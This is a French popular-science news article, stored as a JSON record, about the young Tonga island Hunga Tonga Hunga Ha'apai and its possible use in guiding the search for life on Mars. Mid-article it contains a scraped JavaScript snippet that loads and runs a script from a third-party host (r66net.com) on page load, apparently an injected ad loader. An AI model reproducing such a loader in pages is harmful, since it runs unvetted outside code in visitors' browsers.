{"title": "La plus jeune île du monde nous aidera-t-elle à chercher la vie sur Mars ?", "newspaper": "Futura Sciences", "author": "Par Futura avec l'AFP", "date_publi": "14/12/2017", "content": "La plus jeune île au monde, apparue dans l'archipel des Tonga à la faveur d'une éruption volcanique il y a trois ans, pourrait offrir des pistes pour comprendre le développement potentiel de la vie sur Mars, a annoncé la Nasa. L'île de Hunga Tonga Hunga Ha'apai a émergé lors d'une éruption fin 2014-début 2015 à environ 65 kilomètres au nord-ouest de Nuku'alofa, la capitale de l' archipel  des Tonga. Voir aussi : Une nouvelle île volcanique a vu le jour au Japon Les scientifiques avaient initialement anticipé que cette île, produit de l'expulsion d'énormes  volumes  de roches et de cendres volcaniques, disparaîtrait en quelques mois. Mais l'île qui mesurait initialement un kilomètre de large sur deux de long, et culminait à 120 mètres, a beaucoup mieux résisté que prévu. Peut-être grâce à la consolidation des débris volcaniques en une roche appelée  tuf  volcanique. Et une nouvelle étude de la Nasa, qui a observé en continu par satellite l'évolution  physique  de l'île depuis sa naissance (voir vidéo ci-dessous), lui prête désormais une  espérance de vie  entre six et 30 ans. Reconstitution à partir d’images satellites et de modélisation 3D de l’évolution de l’île Hunga Tonga Hunga Ha'apai sur 33 mois. © Nasa GSFC,  Scientific Visualization Studio , Cindy Starr, Damien Grouille, Cecile Sabau Étudier le cycle de la vie des îles nouvelles sur Terre et… sur Mars  Pour Jim Garvin, chercheur à la Nasa, il y a là une opportunité très rare d'étudier le cycle de la vie sur les nouvelles îles. Il a relevé que la planète Mars possédait de nombreuses anciennes  îles volcaniques  similaires qui étaient vraisemblablement entourées d'eau au moment de leur apparition.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le scientifique explique que ces anciennes îles volcaniques sont des lieux particulièrement intéressants quand il s'agit de rechercher des traces de vie passées car elles ont pu être un terreau fertile en ce qu'elles cumulaient  chaleur  et humidité. Observer comment la vie colonise Hunga Tonga Hunga Ha'apai peut par conséquent aider les scientifiques à comprendre où chercher sur Mars des  traces de vie , insiste Jim Garvin. « Tout ce que nous apprenons sur ce que nous voyons sur Mars est basé sur l'expérience de l'interprétation des phénomènes terrestres , a-t-il déclaré dans le  communiqué de la Nasa .  Nous pensons qu'il y a eu des éruptions sur Mars à une époque où il y avait des zones d'eau persistantes en surface. Nous pourrions utiliser cette nouvelle île des Tonga et son évolution pour tester si l'un de ceux-ci représentait un environnement océanique ou un lac éphémère. »  Ces environnements qui furent humides et chauds pourraient donc être des cibles privilégiées pour la recherche de traces de vie passés sur Mars. Dans quelques mois, le site d'investigation du futur  rover   Mars 2020  qui recherchera d'éventuelles signatures biologiques sur la Planète rouge à partir de 2021 sera connu. Voir aussi : ExoMars 2020 : détecter des traces de vie sur la Planète rouge ne sera pas facile Les îles Tonga, un royaume de quelque 170 îles qui compte environ 120.000 habitants, sont situées sur la «  ceinture de feu  » du Pacifique, où les plaques continentales se rencontrent, causant une activité sismique et volcanique intense. Cela vous intéressera aussi La mission ExoMars entame sa quête de vie martienne                       Y-a-t-il de la vie sur Mars ? La mission ExoMars devrait bientôt répondre à cette question. Partie il y a peu pour la Planète rouge, la sonde de l’Agence spatiale européenne (Esa) arrivera en octobre 2016 à destination. La chaîne Euronews nous parle de son voyage et de ses objectifs dans ce nouvel épisode de Space.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  vie sur mars -elle possible  |  en combien de temps terre tourne elle sur elle meme  |  lune tourne elle sur elle meme  |  jeune pie  |  jeune garcon  |  jeune moineau  |  chercher quelqu sur internet", "theme": "sciences"}